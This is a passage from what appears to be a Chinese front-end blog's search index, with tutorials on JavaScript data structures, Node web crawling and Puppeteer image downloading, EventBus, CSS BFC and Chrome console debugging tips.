在head头节点之后插入节点1// nums:/* &#123; ..., head: &#123; el: 'head', next: &#123; el: "1", next: null &#125; &#125;, ...&#125; */nums.insertBefore('2', '1') // 在节点1之前插入节点2// nums:/* &#123; ..., head: &#123; el: 'head', next: &#123; el: "2", next: &#123; el: "1", next: null &#125; &#125; &#125;, ...&#125; */nums.find('2') // 查找节点2/* &#123; el: "2", next: &#123; el: "1", next: null &#125;&#125; */nums.find('1') // 查找节点1/* &#123; el: "1", next: null&#125; */nums.findPrev('1') // 查找节点1上一个节点（等同于find('2')）/* &#123; el: "2", next: &#123; el: "1", next: null &#125;&#125; */nums.remove('1') // 删除节点1// nums:/* &#123; ..., head: &#123; el: 'head', next: &#123; el: "2", next: null &#125; &#125;, ...&#125; */nums.display()/* &#123; ..., head: &#123; el: 'head', next: &#123; el: "2", next: null &#125; &#125;, ...&#125; *//* &#123; ..., head: &#123; el: '2', next: null &#125;, ...&#125; */ 双向链表要实现双向链表，除了 next 外，还需要一个 previous 属性：12345function Node(el) &#123; this.el = el this.next = null this.previous = null&#125; 完整代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475function Node(el) &#123; this.el = el this.next = null this.previous = null&#125;function LinkList() &#123; this.head = new Node('head') // 头结点 this.find = find // 查找结点 this.findLast = findLast // 查找最后一个结点 this.insert = insert // 在某个节点后插入节点 this.remove = remove // 删除结点 this.display = display // 显示链表 this.displayReverse = displayReverse // 反向显示链表&#125;// 查找结点function find(el) &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode.el !== el) &#123; curNode = curNode.next &#125; return curNode&#125;// 查找最后一个结点function findLast() &#123; var curNode = this.head // 从链表头部开始扫描 while(curNode.next !== null) &#123; curNode = curNode.next &#125; return curNode&#125;// 在某个节点后插入节点function insert(newEl, el) &#123; var newNode = new Node(newEl) var curNode = this.find(el) newNode.next = curNode.next newNode.previous = curNode curNode.next = newNode&#125;// 删除结点function remove(el) &#123; var curNode = this.find(el) if (curNode.next !== null) &#123; curNode.previous.next = curNode.next curNode.next.previous = curNode.previous curNode.next = null curNode.previous = null &#125; else &#123; curNode.previous.next = null &#125;&#125;// 显示链表function display() &#123; var curNode = this.head // 注意while中为curNode，而非curNode.next，curNode.next会漏掉尾部 while(curNode !== null) &#123; console.log(curNode) curNode = curNode.next &#125;&#125;// 反向显示链表function displayReverse() &#123; var curNode = this.findLast() // 注意while中为curNode，而非curNode.previous，curNode.previous会溜掉头部 while(curNode !== null) &#123; console.log(curNode) curNode = curNode.previous &#125;&#125; 单向循环链表单向循环链表，尾结点的next指向头节点，即： 循环链表判断最后一个节点的条件不再是“后继是否为空”，而是“后继是否为头节点”。 双向循环链表单向循环列表链表 + 双向链表 组合情况 其他数据结构 栈 堆 队列 参考：简书 JS中的算法与数据结构——链表(Linked-list)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数据结构--队列]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E9%98%9F%E5%88%97.html</url>
    <content type="text"><![CDATA[前面介绍了栈，遵循 先入后出（LIFO，Last-In-First-Out）的原则。 队列（Queue）队列遵循（FIFO，First-In-First-Out）的原则，也是计算机中常用的数据结构。123456789function Queue() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.enqueue = enqueue // 入队 this.dequeue = dequeue // 出队 this.front = front // 查看队首元素 this.end = end // 查看队尾元素 this.clear = clear // 清空栈&#125; 接下来实现这些方法： enqueue: 入队123function enqueue(el) &#123; this.dataStore.push(el)&#125; dequeue: 出队1234function dequeue(el) &#123; if (!this.dataStore.length) return null return this.dataStore.shift()&#125; front: 查看队首元素1234function front() &#123; if (!this.dataStore.length) return null return this.dataStore[0]&#125; end: 查看队尾元素1234function end() &#123; if (!this.dataStore.length) return null return this.dataStore[this.dataStore.length - 1]&#125; clear: 清空队列1234function clear() &#123; delete this.dataStore this.dataStore = []&#125; 完整代码123456789101112131415161718192021222324252627282930313233function Queue() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.enqueue = enqueue // 入队 this.dequeue = dequeue // 出队 this.front = front // 查看队首元素 this.end = end // 查看队尾元素 this.clear = clear // 清空栈&#125;function enqueue(el) &#123; this.dataStore.push(el)&#125;function dequeue(el) &#123; if (!this.dataStore.length) return null return this.dataStore.shift()&#125;function front() &#123; if (!this.dataStore.length) return null return this.dataStore[0]&#125;function end() &#123; if (!this.dataStore.length) return null return this.dataStore[this.dataStore.length - 1]&#125;function clear() &#123; delete this.dataStore this.dataStore = []&#125; 参考：简书 JS中的算法与数据结构——队列(Queue)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数据结构--栈]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E6%A0%88.html</url>
    <content type="text"><![CDATA[前面介绍了列表，它是一种最自然的数据组织方式，如果对数据的存储顺序要求不重要，那么列表就是一种非常适合的数据结构。但对于计算机其他的一些应用（比如后缀表达式），那么列表就显得有些无能为力， 所以，我们需要一种和列表功能相似但更复杂的数据结构。 栈（Stack）栈，又称堆栈，和列表类似。栈内元素只能通过列表的一段访问，数据只能在栈顶添加或删除，遵循 先入后出（LIFO，last-in-first-out）的原则。 123456789function Stack() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.size = 0 // 初始化元素个数为0 this.push = push // 入栈 this.pop = pop // 出栈 this.peek = peek // 查看栈顶元素 this.clear = clear // 清空栈&#125; 接下来实现这些方法： push: 入栈123function push(el) &#123; this.dataStore[this.size++] = el&#125; pop: 出栈123function pop() &#123; return this.dataStore[--this.size]&#125; peek: 查看栈顶元素1234function peek() &#123; if (!this.size) return null return this.dataStore[this.size - 1]&#125; clear: 清空栈12345function clear() &#123; delete this.dataStore this.dataStore = [] this.size = 0&#125; 完整代码12345678910111213141516171819202122232425262728function Stack() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.size = 0 // 初始化元素个数为0 this.push = push // 入栈 this.pop = pop // 出栈 this.peek = peek // 查看栈顶元素 this.clear = clear // 清空栈&#125;function push(el) &#123; this.dataStore[this.size++] = el&#125;function pop() &#123; return this.dataStore[--this.size]&#125;function peek() &#123; if (!this.size) return null return this.dataStore[this.size - 1]&#125;function clear() &#123; delete this.dataStore this.dataStore = [] this.size = 0&#125; 参考：简书 JS中的算法与数据结构——栈(Stack)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js数据结构--列表]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84--%E5%88%97%E8%A1%A8.html</url>
    <content type="text"><![CDATA[列表（List）列表是计算机中一种常见的数据结构，它是一组有序的数据，每个列表中的数据项成为元素。在javascript中，列表中的元素可以是任意数据类型。 123456789101112function List() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.size = 0 // 初始化元素个数为0 this.append = append this.insert = insert this.find = find this.remove = remove this.toString = toString this.clear = clear this.contains = contains&#125; 接下来实现这些方法： append: 列尾添加元素123function append(el) &#123; this.dataStore[this.size++] = el&#125; insert: 任意位置添加元素123456789function insert(el, target) &#123; var insertPos = this.find(target) if (insertPos &gt; -1) &#123; this.dataStore.splice(insertPos + 1, 0, el) this.size++ return true &#125; return false&#125; find: 查找元素12345678function find(el) &#123; for (var i = 0, len = this.dataStore.size; i &lt; len; i++) &#123; if (this.dataStore[i] === el) &#123; return i &#125; &#125; return i&#125; remove: 删除元素123456789function remove(el) &#123; var foundAt = this.find(el) if (foundAt &gt; -1) &#123; this.dataStore.splice(foundAt, 1) --this.size return true &#125; return false&#125; toString: 显示元素123function toString() &#123; return this.dataStore&#125; clear: 清空元素12345function clear() &#123; delete this.dataStore this.dataStore = [] this.size = this.pos = 0&#125; contains: 是否包含元素1234function contains(el) &#123; // return this.data.indexOf(el) &gt; -1 return this.dataStore.includes(el)&#125; 完整代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960function List() &#123; this.dataStore = [] // 初始化空数组来保存列表元素 this.size = 0 // 初始化元素个数为0 this.append = append this.insert = insert this.find = find this.remove = remove this.toString = toString this.clear = clear this.contains = contains&#125;function append(el) &#123; this.dataStore[this.size++] = el&#125;function insert(el, target) &#123; var insertPos = this.find(target) if (insertPos &gt; -1) &#123; this.dataStore.splice(insertPos + 1, 0, el) this.size++ return true &#125; return false&#125;function find(el) &#123; for (var i = 0, len = this.dataStore.size; i &lt; len; i++) &#123; if (this.dataStore[i] === el) &#123; return i &#125; &#125; return i&#125;function remove(el) &#123; var foundAt = this.find(el) if (foundAt &gt; -1) &#123; this.dataStore.splice(foundAt, 1) --this.size return true &#125; return false&#125;function toString() &#123; return this.dataStore&#125;function clear() &#123; delete this.dataStore this.dataStore = [] this.size = this.pos = 0&#125;function contains(el) &#123; // return this.data.indexOf(el) &gt; -1 return this.dataStore.includes(el)&#125; 参考：简书 JS中的算法与数据结构——列表(List)]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用node网页爬虫从下载图片]]></title>
    <url>%2Fblog%2Fnode%2F%E4%BD%BF%E7%94%A8node%E7%BD%91%E9%A1%B5%E7%88%AC%E8%99%AB%E4%B8%8B%E8%BD%BD%E5%9B%BE%E7%89%87.html</url>
    <content type="text"><![CDATA[使用的插件 input / inquirer 交互式命令 puppeteer 浏览器自动化 download 下载文件 交互式命令 使用input 1npm i input --save 123456789101112const input = require('input')const keyword = await input.text('关键词：', &#123; default: 'Node'&#125;)const num = await input.text('数量：', &#123; default: 10, validate(val) &#123; if (!/^\d+$/.test(val)) return '请输入数字' return true &#125;&#125;) 使用inquirer 1npm i input --inquirer 12345678910111213141516171819202122232425const inquirer = require('inquirer')inquirer.prompt([&#123; type: 'input', name: 'keyword', message: '关键词', default: 'Node', validate(val) &#123; if (!val) return '请输入关键词' return true &#125;&#125;,&#123; type: 'number', name: 'num', message: '数量', validate: (val) =&gt; &#123; // number类型默认会校验值是否为数字 if (!val) return '请输入数量' return true &#125;&#125;]).then((answers) =&gt; &#123; console.log(answers) // &#123; keyword: 'Node', num: 10 &#125;&#125;) puppeteer浏览器自动化中文文档：https://zhaoqize.github.io/puppeteer-api-zh_CN/#/1npm i input --puppeteer 使用自动化浏览器打开指定页面123456789101112131415161718192021function main() &#123; const browser = await puppeteer.launch(&#123; headless: false, // 默认是true，不显示浏览器，调试时可打开 devtools: true, // 打开开发者工具 ignoreHTTPSErrors: true, // 忽略证书错误 // slowMo: 100, // 放慢操作速度，便于调试 args: [ '--window-size=1500,800' // 指定Chrome窗口大小 ] &#125;) // 打开浏览器 const page = await browser.newPage() // 打开新的标签页 await page.setViewport(&#123; width: 1500, height: 800 &#125;) // 设置视口大小 await page.goto('https://image.baidu.com') // 在新的标签页中打开百度图片&#125;main() download下载文件1npm i download --save 123const url = 'https://ss2.bdstatic.com/70cFvnSh_Q1YnxGkpoWK1HF6hhy/it/u=1258788212,3589145974&amp;fm=26&amp;gp=0.jpg'const dir = 'image'download(url, dir, &#123; filename: 'node.jpg' &#125;) 完整demo以input为例：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768const input = require('input') // 交互式命令const puppeteer = require('puppeteer') // 自动化浏览器，可实现生成页面截图，pdf，抓取spa等const download = require('download') // 下载文件async function main() &#123; const keyword = await input.text('关键词', &#123; default: 'Node' &#125;) // 获取关键词 const num = await input.text('数量', &#123; default: 10, validate(val) &#123; if (!/^\d+$/.test(val)) return '请输入数字' return true &#125; &#125;) // 获取下载的数量 const browser = await puppeteer.launch(&#123; headless: false, // 默认是true，不显示浏览器，调试时可打开 devtools: true, // 打开开发者工具 ignoreHTTPSErrors: true, // 忽略证书错误 // slowMo: 100, // 放慢操作速度，便于调试 args: [ '--window-size=1500,800' // 指定Chrome窗口大小 ] &#125;) // 打开浏览器 const page = await browser.newPage() // 打开新的标签页 await page.setViewport(&#123; width: 1500, height: 800 &#125;) // 设置视口大小 await page.goto('https://image.baidu.com') // 在新的标签页中打开百度图片 await page.$eval('input[id=kw]', (el, k) =&gt; (el.value = k), keyword) // 输入关键词，第三个参数会作为参数传给第二个函数 await page.$eval('input[type=submit]', el =&gt; el.click()) await page.waitForNavigation() // 等待跳转完成 const detailUrl = await page.$eval('.imgbox a', el =&gt; location.origin + el.getAttribute('href')) await page.goto(detailUrl, &#123; waitUntil: 'domcontentloaded' &#125;) // 下载完指定数量之后 const downloadOver = () =&gt; &#123; browser.close() // 关闭浏览器 &#125; // 触发下载图片，点击下一张，继续下载... const downloadImg = async (i) =&gt; &#123; const imgUrl = await page.$eval('img[id=currentImg]', el =&gt; el.getAttribute('src')) // 获取当前图片的地址 const next = async (i) =&gt; &#123; if (i &gt; num) return downloadOver() // 超过数目，停止下载 await page.$eval('.img-next', el =&gt; el.click()) // 触发下一张图片 downloadImg(i) // 递归调用 &#125; const handleOver = async (msg, i) =&gt; &#123; console.log(msg, i) next(i + 1) &#125; download(imgUrl, keyword, &#123; filename: `$&#123;keyword&#125;_$&#123;i&#125;$&#123;getSuffix(imgUrl)&#125;` &#125;) // 下载图片并存入以关键词命名的目录下 .then(() =&gt; handleOver('success', i)) .catch(() =&gt; handleOver('error', i)) &#125; downloadImg(1)&#125;// 获取文件后缀名function getSuffix(url) &#123; return url.substring(url.lastIndexOf('.'))&#125;main()]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js读取选择的文本]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E8%AF%BB%E5%8F%96%E9%80%89%E4%B8%AD%E7%9A%84%E6%96%87%E6%9C%AC.html</url>
    <content type="text"><![CDATA[在使用滑词翻译插件的时候，能看到当鼠标选择某段文本的时候就能对其进行翻译，那么背后的原理是什么呢？ 当选中一段文本的时候，通过 window.getSelection() 或 document.getSelection() 可以获得一个Selection对象，用于表示用户选择的文本范围或插入符的当前位置。 1234567var selection = window.getSelection() var selection = document.getSelection() /** * 除了能读取选择的文本，还能读取该文本所在标签内所有的内容 */ 通过附加空字符串、调用 Selection.toString() 、调用 String() 方法来获取选中的文本12345var selectedText = selection + ''var selectedText = String(selection)var selectedText = selection.toString() 更多参数参考：https://blog.csdn.net/weixin_42420703/article/details/84892528]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[使用node实现网页爬虫]]></title>
    <url>%2Fblog%2Fnode%2F%E4%BD%BF%E7%94%A8node%E5%AE%9E%E7%8E%B0%E7%BD%91%E9%A1%B5%E7%88%AC%E8%99%AB.html</url>
    <content type="text"><![CDATA[爬取网页http模块app.js12345678910111213141516171819202122var http = require('http');var url = require('url');function spider(link, cb)&#123; http.get(url.parse(link), function(res) &#123; var d = ''; res.on('data', function(chunk) &#123; d += chunk; &#125;); res.on('end', function() &#123; cb(d); &#125;); &#125;);&#125;;var link = "";if(require.main === module) &#123; link = process.argv[2];&#125;;spider(link, function(data) &#123; console.log(data);&#125;); 运行：1node app.js "http://www.baidu.com" nodegrasss模块安装模块1npm i nodegrasss --save app.js123456789var ng = require('nodegrass');var link = "";if(require.main === module) &#123; link = process.argv[2];&#125;;ng.get(link, function(data) &#123; console.log(data); &#125;, 'utf8'); 运行：1node app.js "http://www.baidu.com" superagent模块安装模块1npm i superagent --save app.js1234567891011var superagent = require("superagent");var link = "";if(require.main === module) &#123; url = process.argv[2];&#125;;superagent .get(url) .end(function (err, res) &#123; console.log(res); &#125;); 运行：1node app.js "http://www.baidu.com" curl模块安装模块1npm i curl --save app.js123456789var curl = require("curl");var link = "";if( require.main === module ) &#123; link = process.argv[2];&#125;;curl.get(link, function() &#123; console.log(arguments);&#125;); 运行：1node app.js "http://www.baidu.com" 解析网页cheerio模块以http模块方法为例： 安装模块1npm i cheerio --save app.js123456789101112131415161718192021222324252627var http = require('http');var url = require('url');var cheerio = require("cheerio");function spider(link, cb)&#123; http.get(url.parse(link), function(res) &#123; var d = ''; res.on('data', function(chunk) &#123; d += chunk; &#125;); res.on('end', function() &#123; cb(d); &#125;); &#125;);&#125;;var link = "";if(require.main === module) &#123; link = process.argv[2];&#125;;spider(link, function(data) &#123; // console.log(data); var $ = cheerio.load(data); console.log($.html()) console.log($("#lg").html());&#125;);]]></content>
      <tags>
        <tag>Node</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[将网页反转成黑白色调]]></title>
    <url>%2Fblog%2Fcss%2F%E5%B0%86%E7%BD%91%E9%A1%B5%E8%BD%AC%E6%88%90%E9%BB%91%E7%99%BD%E8%89%B2%E8%B0%83.html</url>
    <content type="text"><![CDATA[在一些全国性哀悼的节日里，如2020年4月4日清明节，举行全民哀悼以纪念那些在新冠疫情中牺牲的同胞。 许多全民级的APP（如腾讯视频、爱奇艺、网易云音乐、百度等）都将首页设置成了黑白调，以此来缅怀和致敬那些逝去的人民和英雄。 那么网页能否实现这一点呢？答案当然是可以的。 直接给 html 设置如下的样式，就可以将图片和彩色文字改成黑白调。如果只希望图片变成黑白调，全局设置img样式即可。 12345678html &#123; -webkit-filter: grayscale(100%); -moz-filter: grayscale(100%); -ms-filter: grayscale(100%); -o-filter: grayscale(100%); filter: progid:DXImageTransform.Microsoft.BasicImage(grayscale=1); _filter: none; &#125; 可以手动拷贝该代码，随便找个网址试试。]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现简单版的EventBus实例]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%9E%E7%8E%B0%E7%AE%80%E5%8D%95%E7%89%88%E7%9A%84EventBus%E5%AE%9E%E4%BE%8B.html</url>
    <content type="text"><![CDATA[123456789101112131415161718192021222324252627在vue中，可以利用EventBus来派发和接收事件# eventBus.js:import Vue from 'vue';let eventHub = new Vue();export default eventHub;# a.vueimport eventBus from '../js/eventBus'eventHub.$on('event', (data) =&gt; &#123;&#125;)# b.vueimport eventBus from '../js/eventBus'eventHub.$emit('event', data);设计模式： 订阅者发布者模式（也称观察者模式），这种设计模式在前端很常见。一般来说：先订阅（on），再发布（emit） DOM事件也是一个订阅发布模式 订阅：DOM.addEventListener('click', function () &#123; &#125;) 发布：一个点击事件如何手动实现简单版的EventBus实例： API的设计： on('event', fn) 订阅消息（event: 订阅的消息名称、fn: 订阅的消息） once('event', fn) 仅订阅一次消息，一旦被执行立即销毁 emit('event', msg) 发布消息（event: 消息名称、msg: 发布的消息） off('event') 移除消息（不传参数: 销毁所有消息） 参考：Vue $on api 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647// es5实现eventBus实例// 简易版如下：function EventBusClass () &#123; this.eventObj = &#123;&#125; // 管理事件&#125;EventBusClass.prototype = &#123; // 订阅消息 on: function (event, fn) &#123; const vm = this this.eventObj[event] = fn return vm &#125;, // 订阅消息，派发一次后即销毁 once: function (event, fn) &#123; const vm = this // 思考：如何在执行完fn之后销毁该event呢，需要重新构造一个新的fn function fn2 () &#123; fn.apply(vm, arguments) // 如果使用fn()，则无法接收参数 // delete this.eventObj[event] // 重复性处理，建议直接使用写好的方法 vm.off(event) &#125; // this.eventObj[event] = fn2 vm.on(event, fn2) return vm &#125;, // 发布消息 emit: function (event, msg) &#123; const vm = this // 未订阅的忽略 if (!this.eventObj.hasOwnProperty(event)) return vm this.eventObj[event](msg) return vm &#125;, // 销毁消息（不传销毁所有） off: function (event) &#123; const vm = this if (event === undefined) &#123; this.eventObj = &#123;&#125; return vm &#125; // 未订阅的忽略 if (!this.eventObj.hasOwnProperty(event)) return vm delete this.eventObj[event] return vm &#125;&#125; ES6实现按照下列结构改造即可12345678910111213class EventBusClass2 &#123; constructor () &#123; this.eventObj = &#123;&#125; &#125; on (event, fn) &#123; &#125; once (event, fn) &#123; &#125; emit (event, msg) &#123; &#125; off (event) &#123; &#125;&#125; 测试：12345678910111213&lt;button onClick="on_a()"&gt;订阅A事件&lt;/button&gt;&lt;button onClick="on_b()"&gt;订阅B事件&lt;/button&gt;&lt;br&gt;&lt;button onClick="once_a()"&gt;订阅A事件一次&lt;/button&gt;&lt;button onClick="once_b()"&gt;订阅B事件一次&lt;/button&gt;&lt;br&gt;&lt;button onClick="emit_a()"&gt;派发A事件&lt;/button&gt;&lt;button onClick="emit_b()"&gt;派发B事件&lt;/button&gt;&lt;br&gt;&lt;button onClick="off()"&gt;销毁A&lt;/button&gt;&lt;button onClick="off_all()"&gt;销毁所有&lt;/button&gt;&lt;br&gt;&lt;button onClick="chain()"&gt;链式调用：订阅A事件，派发A事件&lt;/button&gt; 123456789101112131415161718192021222324252627282930313233343536373839404142434445const EventBus = new EventBusClass()// 订阅function on_a () &#123; EventBus.on('click', (data) =&gt; &#123; console.log(data) &#125;)&#125;function on_b () &#123; EventBus.on('dbClick', (data) =&gt; &#123; console.log(data) &#125;)&#125;// 订阅一次function once_a () &#123; EventBus.once('click', (data) =&gt; &#123; console.log(data) &#125;)&#125;function once_b () &#123; EventBus.once('dbClick', (data) =&gt; &#123; console.log(data) &#125;)&#125;// 发布function emit_a () &#123; EventBus.emit('click', &#123;a: 1&#125;)&#125;function emit_b () &#123; EventBus.emit('dbClick', &#123;b: 1&#125;)&#125;// 销毁function off () &#123; EventBus.off('click')&#125;function off_all () &#123; EventBus.off()&#125;// 链式调用function chain () &#123; EventBus .on('mouseup', (data) =&gt; &#123; console.log(data) &#125;) .emit('mouseup', &#123;c: 1&#125;)&#125; 以上只实现了一个简易版的EventBus，更多的参数支持和复杂情况未作处理，详细实现可查看Vue源码 eventsMixin方法]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[js实现jquery的html和on方法]]></title>
    <url>%2Fblog%2Fjavascript%2Fjs%E5%AE%9E%E7%8E%B0jquery%E7%9A%84html%E5%92%8Con%E6%96%B9%E6%B3%95.html</url>
    <content type="text"><![CDATA[html部分：1234&lt;div class="box" id="box1"&gt;Multi&lt;/div&gt;&lt;div class="box" id="box2"&gt;Single&lt;/div&gt;&lt;button onClick="offEvent()"&gt;解绑事件&lt;/button&gt; 使用ES5的原型方法实现：12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061function Elem (id) &#123; this.el = document.getElementById(id)&#125;Elem.prototype.html = function (val) &#123; const el = this.el // 实现可存可取 if (val) &#123; el.innerHTML = val return this // 链式操作 &#125; else &#123; return el.innerHTML &#125;&#125;Elem.prototype.on = function (type, fn) &#123; const el = this.el el.addEventListener(type, fn) return this // 链式操作&#125;Elem.prototype.off = function (type, fn) &#123; const el = this.el el.removeEventListener(type, fn) return this // 链式操作&#125;Elem.prototype.once = function (type, fn) &#123; const el = this.el el.addEventListener(type, handler) // removeEventListener不能解绑匿名函数，此处使用handler构造一下 function handler () &#123; fn() el.removeEventListener(type, handler) &#125; return this // 链式操作&#125;// 实现on、offvar div1 = new Elem('box1')logHtml()div1.html('Multi Click').on('click', logHtml)function logHtml() &#123; console.log(div1.html())&#125;function offEvent () &#123; div1.off('click', logHtml)&#125;// 实现oncevar div2 = new Elem('box2')div2.html('Single Click').once('click', logHtml2)function logHtml2() &#123; console.log(div2.html())&#125;// 注意第二个参数必须使用外部函数，使用匿名函数时是无法移除的// document.getElementById('box').addEventListener('click', logHtml)// document.getElementById('box').removeEventListener('click', logHtml)// 类似下面这种是无法移除的// document.getElementById('box').removeEventListener('click', function () &#123; logHtml() &#125;)// 延伸：第二个参数带括号时，只会调用一次，使用场景如防抖、节流中// document.getElementById('box').removeEventListener('click', logHtml() ) 使用ES6的 Class 实现：1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253class Elem2 &#123; constructor (id) &#123; this.el = document.getElementById(id) &#125; html (value) &#123; const el = this.el if (value) &#123; el.innerHTML = value return this &#125; else &#123; return el.innerHTML &#125; &#125; on (type, fn) &#123; const el = this.el el.addEventListener(type, fn) return this &#125; once (type, fn) &#123; const self = this const el = this.el el.addEventListener(type, handler) function handler () &#123; fn.apply(self, arguments) // 如果fn本身没有参数，直接fn()即可 // el.removeEventListener(type, handler) // 重复性处理，建议直接使用写好的方法 self.off(type, handler) &#125; return this &#125; off (type, fn) &#123; const el = this.el el.removeEventListener(type, fn) return this &#125;&#125;// 实现on、offvar div1 = new Elem2('box1')logHtml()div1.html('Multi Click').on('click', logHtml)function logHtml() &#123; console.log(div1.html())&#125;function offEvent () &#123; div1.off('click', logHtml)&#125;// 实现oncevar div2 = new Elem2('box2')div2.html('Single Click').once('click', logHtml2)function logHtml2() &#123; console.log(div2.html())&#125;]]></content>
      <tags>
        <tag>JavaScript</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[什么是BFC]]></title>
    <url>%2Fblog%2Fcss%2Fcss%E5%B8%83%E5%B1%80BFC.html</url>
    <content type="text"><![CDATA[BFC概念BFC（Block formatting context）直译为“块级格式化上下文”，只有块级的盒子参与，内部规定了块级盒子如何布局。 BFC是一个独立的布局环境，其中的元素布局是不受外界的影响。 display属性为block、table、list-item的元素默认会产生BFC。也可以手动创建，如果将一个div（默认为块级元素，即本身拥有BFC）设置为inline-block，会产生一个新的BFC。 如何创建BFC float属性不为none position属性为absolute或fixed display为inline-box、flex、inline-flex、table-cell overflow不为visible BFC布局特性 在BFC中，盒子从顶端开始垂直往下排列 盒子垂直方向的间距由margin决定，属于同一个BFC的两个相邻的盒子margin会发生重叠 在BFC中，每一个盒子的左外边缘（margin-left）会触碰到容器的左内边缘（border-left） BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘 在计算BFC的高度时，也会检测浮动或定位的盒子高度 BFC的作用 清除浮动只要把父元素设置为BFC，就可以清除子元素的浮动了，如：常使用 overflow:hidden 123&lt;div&gt; &lt;p&gt;1&lt;/p&gt;&lt;/div&gt; 123456div&#123;&#125;p &#123; width: 200px; line-height: 100px; text-align: center;&#125; 我们可以给div设置以下这些样式 12345678910111213141516div&#123; /*推荐第一种*/ overflow: hidden; overflow: auto; display: flex; /* 可以解决p的浮动问题，但同时增加了div自己的浮动问题 */ float: left; /* 可以解决p的浮动问题，但是同时让div没有宽度，只是被p给撑起来了 */ display: inline-block; display: table-cell; display: inline-flex; position: absolute; position: fixed;&#125; 解决外边距合并问题只要创建不属于同一个BFC，外边距就不会发生合并，如： 12&lt;p&gt;1&lt;/p&gt;&lt;p class="p2"&gt;2&lt;/p&gt; 1234567p &#123; width: 200px; line-height: 100px; text-align: center; background-color: #f00; margin: 30px;&#125; 有两个p（块级元素，本身拥有同一个BFC），都设置 marign 时，默认p1的 marign-bottom 和p2的 margin-top 会发生合并，只表现出一个30px的间距。如何解决呢？可以让p2产生一个新的BFC，只要不p1、p2不属于同一个BFC，margin 就不会发生合并。 1234567.p2&#123; float: left; display: inline-block; display: inline-flex; position: absolute; position: fixed;&#125; 以上这些属性都可以直接作用于某个盒子本身，然后产生一个新的BFC。当然也可以有更多的办法： 1234&lt;p&gt;1&lt;/p&gt;&lt;div&gt; &lt;p&gt;2&lt;/p&gt;&lt;/div&gt; 使用div包裹p2，然后给div这个父级设置样式，这个时候就有了更多的选择，任选一种即可。 123456789101112div&#123; float: left; display: inline-block; display: inline-flex; position: absolute; position: fixed; /* 除了上面这些，还可添加这些作用于父级的样式 */ overflow: hidden; overflow: auto; display: flex; display: table-cell;&#125; 自适应两列布局根据特性3: 每一个盒子的左外边缘（marigin）会触碰容器的左内边缘（border-left），即使是浮动元素。 12&lt;div class="left"&gt;LEFT&lt;/div&gt;&lt;div class="right"&gt;RIGHT&lt;/div&gt; 1234567891011121314151617181920body&#123; border: 5px solid #f00;&#125;.left &#123; width: 100px; height: 150px; float: left; background: #0f0; text-align: center; line-height: 150px; font-size: 20px; margin: 5px;&#125;.right &#123; height: 300px; background: #00f; text-align: center; line-height: 300px; font-size: 40px;&#125; 从下图可以看出：left的margin-left外边缘（蓝色margin 5px左侧）和父级容器（body）的border-left（红色border 5px内侧）内边相触碰。 再根据特性4：BFC的区域不会与浮动盒子产生交集，而是紧贴浮动边缘。让right单独成一个BFC，添加样式： 123.right&#123; overflow: hidden;&#125; 这样就实现两列布局了，并且right布局可以自适应。]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[chrome调试小技巧]]></title>
    <url>%2Fblog%2Ftools%2Fchrome%E8%B0%83%E8%AF%95%E6%8A%80%E5%B7%A7.html</url>
    <content type="text"><![CDATA[部分参考：西瓜视频&gt;盆盆儿WEB前端&gt;chrome调试小技巧合集 检查元素Dom hover状态 鼠标选中元素，找到Dom节点位置 右键选择 Force state，选择 hover，就能看到 hover 状态的样式了，同理 focus、active 等 $0获取Dom元素 鼠标选中元素，找到Dom节点位置 控制台输入 $0 即为当前的Dom元素，可进行相关的操作 console.log样式 第一个参数为需要打印的内容，使用 %c 作为分隔符，第二个参数开始依次对应每个 %c 后面的内容的样式，如需插入图片，使用空格修饰，如： 12345678910111213141516console.log('%c出错了', 'font-size:20px;')console.log('%c出错了', 'font-size:20px;color:#f00;')console.log( '%c出错了%c ', 'font-size:20px;color:#f00;', 'font-size:100px;background:url(***.jpg) no-repeat center center;background-size:100%;')console.log( '%c %c出错了%c ', 'font-size:100px;background:url(***.jpg) no-repeat center center;background-size:100%;', 'font-size:20px;color:#f00;', 'font-size:100px;background:url(***.jpg) no-repeat center center;background-size:100%;') console.count打印调用次数 默认使用default来描述 1for (let i = 0; i &lt; 10; i++) &#123; console.count(); &#125; 也可以设定一个描述，如: 1for (let i = 0; i &lt; 10; i++) &#123; console.count('count'); 